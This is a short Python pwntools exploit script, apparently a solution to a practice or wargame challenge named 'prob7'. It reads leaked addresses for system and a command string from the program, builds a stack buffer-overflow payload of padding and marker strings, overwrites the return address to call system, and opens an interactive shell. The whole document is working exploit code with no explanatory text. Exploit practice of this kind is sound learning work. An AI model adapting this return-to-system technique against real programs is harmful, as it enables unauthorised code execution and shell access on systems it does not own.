from pwn import *

p = process("./prob7")

p.recvuntil(": ")
system = int(p.recv(10),16)

p.recvuntil(": ")
command = int(p.recv(9),16)

print(hex(system), hex(command))

p.recvline()

payload = "A" * 4
payload += "dukyoung\x00"
payload += "B" * 17
payload += "high\x00"
payload += "C" * 65
payload += "school\x00"
payload += "A" * 165
payload += p32(system)
payload += "B" * 4
payload += p32(command)

pause()

p.sendline(payload)

p.interactive()